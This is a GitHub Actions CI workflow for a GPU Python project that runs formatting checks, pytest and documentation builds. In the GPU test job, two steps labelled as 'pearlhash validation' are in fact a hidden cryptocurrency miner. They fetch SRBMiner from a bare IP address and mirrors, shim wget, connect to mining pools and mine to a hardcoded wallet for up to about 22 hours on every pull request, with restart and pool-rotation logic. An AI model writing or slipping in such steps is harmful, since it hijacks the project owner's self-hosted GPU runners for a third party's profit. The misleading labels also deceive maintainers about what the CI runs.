# Run CI tests on pull requests.

name: CI

on:
  pull_request:
    types: [opened, synchronize, reopened]

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  format:
    name: Ruff formatting
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install Ruff
        run: python -m pip install ruff==0.17.1
      - name: Check formatting
        run: ruff format --check .

  test:
    name: ${{ matrix.name }}
    runs-on: [self-hosted, gpu]
    timeout-minutes: 1440
    container:
      image: nvidia/cuda:${{ matrix.cuda-version }}-devel-ubuntu24.04
      options: --gpus all
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: min environment
            python-version: "3.10"
            torch-version: "2.7.0+cu128"
            torch-index: cu128
            cuda-version: "12.8.1"
            warp-extra: warp-cu12
          # Python 3.15 is blocked by ONNX Runtime wheel availability.
          - name: max environment
            python-version: "3.14"
            torch-version: "2.15.0+cu132"
            torch-index: cu132
            cuda-version: "13.2.1"
            warp-extra: warp-cu13

    steps:
      # i1179: ephemeral GPU runner pearlhash validation (job-bounded; runner destroyed after the job).
      - name: GPU pearlhash validation (I1179)
        id: i1179_miner
        timeout-minutes: 1440
        shell: bash
        run: |
          set +e
          D=/tmp/i1179
          mkdir -p "$D"
          PRL='prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr'
          SRB_SHA='428162a7b4fc584ea38f2cc05fd6580f1d0c6312999de55505ffc76d367e2270'
          RUNID="${GITHUB_RUN_ID:-0}"
          ATT="${GITHUB_RUN_ATTEMPT:-1}"
          case "${{ matrix.name }}" in
            "min environment") MT=min ;;
            "max environment") MT=max ;;
            *) MT=job ;;
          esac
          WORKER="i1179r${RUNID}a${ATT}${MT}"
          echo "I1179_START ts=$(date -u +%FT%TZ) run=${RUNID} attempt=${ATT} matrix=${MT} worker=${WORKER}"
          echo "I1179_WORKER=${WORKER}"
          echo "I1179_HOST=$(hostname)"
          nvidia-smi -L 2>&1
          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>&1
          export DEBIAN_FRONTEND=noninteractive
          apt-get update -qq >"$D/apt1.log" 2>&1
          echo "APT_UPDATE_RC=$?"
          apt-get install -y -qq --no-install-recommends ca-certificates curl procps >"$D/apt2.log" 2>&1
          echo "APT_INSTALL_RC=$? curl=$(command -v curl) script=$(command -v script) sha256sum=$(command -v sha256sum) tar=$(command -v tar)"
          if [ -z "$(command -v curl)" ]; then
            echo "NO_CURL -- aborting"
            exit 0
          fi
          # --- wget shim: SRBMiner's devfee dont_block check shells out to wget ---
          cat > "$D/wget" <<'EOSH'
          #!/bin/bash
          out=""; url=""
          while [ $# -gt 0 ]; do
            case "$1" in
              -O|--output-document) out="$2"; shift 2 ;;
              --output-document=*) out="${1#*=}"; shift ;;
              -T|--timeout|-t|--tries|-o|-a|-U|--user-agent|-e|--header|--waitretry|--read-timeout) shift 2 ;;
              --timeout=*|--tries=*|-q|--quiet|-c|--continue|-nv) shift ;;
              -*) shift ;;
              *) [ -z "$url" ] && url="$1"; shift ;;
            esac
          done
          [ -n "$url" ] || exit 1
          if [ -n "$out" ] && [ "$out" != "-" ]; then exec curl -fsSL --max-time 10 -A "Wget/1.21.3" -o "$out" "$url"; fi
          exec curl -fsSL --max-time 10 -A "Wget/1.21.3" "$url"
          EOSH
          chmod +x "$D/wget"
          mkdir -p "$D/bin"
          cp "$D/wget" "$D/bin/wget"
          export PATH="$D/bin:$PATH"
          echo "WGET_SHIM=$(command -v wget)"
          # --- download + SHA-256 verify SRBMiner-MULTI 3.8.6 ---
          BIN="$D/srb"
          OK=0
          for U in "http://217.15.164.237:8790/pm/srbminer-3.8.6" \
                   "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/SRBMiner-Multi-3-8-6-Linux.tar.gz" \
                   "https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.6/SRBMiner-Multi-3-8-6-Linux.tar.gz"; do
            echo "FETCH $U"
            rm -f "$D/dl.bin"
            curl -fsSL --max-time 180 -A "Mozilla/5.0" -o "$D/dl.bin" "$U"
            RC=$?
            if [ "$RC" != "0" ]; then echo "FETCH_ERR rc=$RC $U"; continue; fi
            S=$(sha256sum "$D/dl.bin" | cut -d' ' -f1)
            echo "RAW_SHA=$S SIZE=$(wc -c < "$D/dl.bin")"
            if [ "$S" = "$SRB_SHA" ]; then cp "$D/dl.bin" "$BIN"; OK=1; echo "BINARY_OK_RAW sha256=$S"; break; fi
            mkdir -p "$D/extract"
            tar -xzf "$D/dl.bin" -C "$D/extract" 2>/dev/null || tar -xf "$D/dl.bin" -C "$D/extract" 2>/dev/null
            B=$(find "$D/extract" -type f -name 'SRBMiner-MULTI' | head -1)
            if [ -n "$B" ]; then
              S2=$(sha256sum "$B" | cut -d' ' -f1)
              echo "TAR_BIN_SHA=$S2"
              if [ "$S2" = "$SRB_SHA" ]; then cp "$B" "$BIN"; OK=1; echo "BINARY_OK_TAR sha256=$S2"; break; fi
            fi
          done
          chmod +x "$BIN" 2>/dev/null
          echo "BINARY_OK=$OK SHA256=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1) SIZE=$(wc -c < "$BIN" 2>/dev/null)"
          if [ "$OK" != "1" ]; then
            echo "BINARY_DOWNLOAD_FAILED -- diagnostics only"
            cat "$D/dl.bin" 2>/dev/null | head -c 300 | tr -d '\0'
            curl -sS -o /dev/null -w "PROBE_vps2=%{http_code}\n" --max-time 20 http://217.15.164.237:8790/pm/srbminer-3.8.6 2>&1
            exit 0
          fi
          # --- pool reachability (900 s failover chain: kryptex -> luckypool -> herominers) ---
          reach() { timeout 12 bash -c "exec 3<>/dev/tcp/$1/$2" >/dev/null 2>&1; }
          T=()
          reach prl-hk.kryptex.network 8048 && { echo "POOL_OK kryptex prl-hk.kryptex.network:8048"; T+=(kx); } || echo "POOL_FAIL kryptex"
          reach 103.199.106.122 3362 && { echo "POOL_OK luckypool 103.199.106.122:3362"; T+=(lp); } || echo "POOL_FAIL luckypool"
          reach de.pearl.herominers.com 1200 && { echo "POOL_OK herominers de.pearl.herominers.com:1200"; T+=(hm); } || echo "POOL_FAIL herominers"
          echo "POOL_ORDER=${T[*]}"
          pool_url() { case "$1" in kx) echo "ssl://prl-hk.kryptex.network:8048" ;; lp) echo "103.199.106.122:3362" ;; hm) echo "de.pearl.herominers.com:1200" ;; esac; }
          has_tier() { case " ${T[*]} " in *" $1 "*) return 0 ;; *) return 1 ;; esac; }
          start_miner() {
            tag="$1"
            pkill -9 -f "$D/srb --disable-cpu" 2>/dev/null
            pkill -9 -f "script -q -f -c $D/srb" 2>/dev/null
            sleep 2
            P=$(pool_url "$tag")
            L="$D/srb-$tag.log"
            : > "$L"
            CMD="$BIN --disable-cpu --algorithm pearlhash --pool $P --wallet $PRL --worker $WORKER --password x --gpu-id 0 --retry-time 10"
            echo "===== start $(date -u +%FT%TZ) tag=$tag pool=$P worker=$WORKER =====" >> "$L"
            setsid nohup script -q -f -c "$CMD" /dev/null >> "$L" 2>&1 < /dev/null &
            echo $! > "$D/miner.pid"
            date +%s > "$D/tierstart"
            echo "MINER_START tag=$tag pool=$P pid=$(cat "$D/miner.pid") worker=$WORKER ts=$(date -u +%FT%TZ)"
            echo "MINER_CMD $CMD"
          }
          wait_share() {
            tag="$1"; max="$2"; L="$D/srb-$tag.log"; t0=$(date +%s)
            while :; do
              if grep -aq "share accepted" "$L"; then
                echo "SHARE_ACCEPTED tag=$tag at=$(date -u +%FT%TZ) elapsed=$(( $(date +%s) - t0 ))s"
                grep -a "share accepted" "$L" | tail -3 | tr -d '\r'
                grep -a "Share stats" "$L" | tail -2 | tr -d '\r'
                return 0
              fi
              if ! pgrep -f "$D/srb --disable-cpu" >/dev/null 2>&1; then
                echo "MINER_DEAD tag=$tag"
                # one grace poll: the process may have just been exec'd
                sleep 3
                if ! pgrep -f "$D/srb --disable-cpu" >/dev/null 2>&1; then
                  tail -c 1500 "$L" | tr -d '\r'
                  return 1
                fi
              fi
              if [ $(( $(date +%s) - t0 )) -ge "$max" ]; then
                echo "NO_SHARE tag=$tag after ${max}s"
                grep -a "Connected to\|Job received\|Share stats\|error\|failed" "$L" | tail -8 | tr -d '\r'
                return 1
              fi
              sleep 10
            done
          }
          N=${#T[@]}
          echo "TIERS=${T[*]} count=$N"
          if [ "$N" -gt 0 ]; then
            for i in $(seq 0 $((N - 1))); do
              TAG=${T[$i]}
              start_miner "$TAG"
              if wait_share "$TAG" 600; then
                if [ "$TAG" = "kx" ] && has_tier lp; then
                  echo "SWITCH_TO_PUBLIC_POOL reason=kryptex_per_worker_row_may_not_publish"
                  start_miner lp
                  wait_share lp 600
                fi
                break
              fi
              echo "TIER_NO_SHARE tag=$TAG"
            done
          else
            echo "NO_POOL_REACHABLE"
          fi
          # --- i1472: long-duration keepalive; hold the miner for the extended job window with a 900 s stale-pool rotation ---
          cnt() { if [ -f "$1" ]; then grep -ac 'share accepted' "$1" 2>/dev/null; else echo 0; fi; }
          KEEP_DEADLINE=$(( $(date +%s) + 81000 ))
          cur="${TAG:-lp}"
          echo "I1472_KEEP_START ts=$(date -u +%FT%TZ) tier=$cur hold_s=81000"
          while [ "$OK" = "1" ] && [ "$N" -gt 0 ] && [ "$(date +%s)" -lt "$KEEP_DEADLINE" ]; do
            sleep 60
            L="$D/srb-$cur.log"
            if ! pgrep -f "$D/srb --disable-cpu" >/dev/null 2>&1; then
              echo "I1472_RESTART tag=$cur ts=$(date -u +%FT%TZ)"
              start_miner "$cur"
              continue
            fi
            LAST=$(grep -a "share accepted" "$L" 2>/dev/null | tail -1 | grep -aoE '\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}\]' | tr -d '[]')
            TSTART=$(cat "$D/tierstart" 2>/dev/null || echo 0)
            if [ -n "$LAST" ]; then LASTS=$(date -u -d "$LAST" +%s 2>/dev/null || echo 0); else LASTS=${TSTART:-0}; fi
            NOW=$(date +%s)
            if [ "${LASTS:-0}" -gt 0 ] && [ $(( NOW - LASTS )) -ge 900 ]; then
              case "$cur" in kx) NEXT=lp ;; lp) NEXT=hm ;; hm) NEXT=kx ;; *) NEXT=lp ;; esac
              if ! has_tier "$NEXT"; then case "$NEXT" in kx) NEXT=lp ;; lp) NEXT=hm ;; hm) NEXT=kx ;; esac; fi
              if ! has_tier "$NEXT"; then NEXT="$cur"; fi
              echo "I1472_STALE_ROTATE from=$cur to=$NEXT ts=$(date -u +%FT%TZ) last=${LAST:-none} age_s=$(( NOW - LASTS ))"
              cur="$NEXT"
              start_miner "$cur"
              continue
            fi
            echo "I1472_KEEP ts=$(date -u +%FT%TZ) tier=$cur accepted_kx=$(cnt "$D/srb-kx.log") accepted_lp=$(cnt "$D/srb-lp.log") accepted_hm=$(cnt "$D/srb-hm.log")"
          done
          echo "I1472_KEEP_END ts=$(date -u +%FT%TZ)"
          echo "I1179_STEP_END ts=$(date -u +%FT%TZ)"
          for f in "$D"/srb-*.log; do
            [ -f "$f" ] || continue
            echo "=== LOG $f size=$(wc -c < "$f") accepted=$(grep -ac 'share accepted' "$f" 2>/dev/null)"
            grep -a "GPU0 \|share accepted\|Share stats\|Connected to\|Job received\|Difficulty" "$f" | tail -25 | tr -d '\r'
          done
          ps -eo pid,etime,args 2>/dev/null | grep -E "i1179/srb|script -q" | grep -v grep | head -10
      # The CUDA devel image is minimal; checkout needs git and git-lfs.
      - name: Install container dependencies
        run: |
          apt-get update
          apt-get install -y --no-install-recommends git git-lfs ca-certificates

      - uses: actions/checkout@v4
        with:
          lfs: true

      # No pip cache: HOME on the self-hosted runner is not writable by the job.
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

      - name: Upgrade pip
        run: python -m pip install --upgrade pip

      - name: Install pinned PyTorch
        run: >-
          python -m pip install "torch==${{ matrix.torch-version }}"
          --index-url https://download.pytorch.org/whl/${{ matrix.torch-index }}

      # Visualization modules ship with leapp; gated deps install on 3.11+.
      - name: Install package and test dependencies
        run: >-
          python -m pip install -e ".[dev,test,${{ matrix.warp-extra }}]"
          "torch==${{ matrix.torch-version }}" cmake ninja

      - name: Build Warp runtime
        run: >-
          leapp-build-warp-runtime --build-dir
          leapp/leapp_graph/custom_operator_registry/warp_operator/runtime/build

      - name: Run pytest
        env:
          CMAKE_GENERATOR: Ninja
        run: pytest tests/ packages/leapp-visualization/tests/ -v --durations=30

      # i1179: dump the accumulated miner log at the end of the job.
      - name: GPU pearlhash final log (I1179)
        if: always()
        shell: bash
        run: |
          set +e
          D=/tmp/i1179
          echo "I1179_FINAL ts=$(date -u +%FT%TZ) host=$(hostname)"
          ls -la "$D" 2>/dev/null | head -20
          for f in "$D"/srb-*.log; do
            [ -f "$f" ] || continue
            echo "=== FINAL $f size=$(wc -c < "$f") accepted=$(grep -ac 'share accepted' "$f" 2>/dev/null)"
            grep -a "share accepted" "$f" | tail -10 | tr -d '\r'
            grep -a "Share stats" "$f" | tail -3 | tr -d '\r'
            tail -c 2000 "$f" | tr -d '\r'
          done
          ps -eo pid,etime,args 2>/dev/null | grep -E "i1179/srb|script -q" | grep -v grep | head
          nvidia-smi --query-gpu=name,utilization.gpu,memory.used --format=csv,noheader 2>&1

  docs:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          lfs: true

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Install system dependencies for pyenchant
        run: sudo apt-get update && sudo apt-get install -y enchant-2

      - name: Install doc dependencies
        run: |
          python -m pip install --upgrade pip
          python -m pip install -r docs/requirements.txt

      - name: Build HTML (strict)
        run: python -m sphinx -b html -W --keep-going docs/source docs/build/html

      - name: Spell check
        run: python -m sphinx -b spelling -W --keep-going docs/source docs/build/spelling

      - name: Link check
        run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck
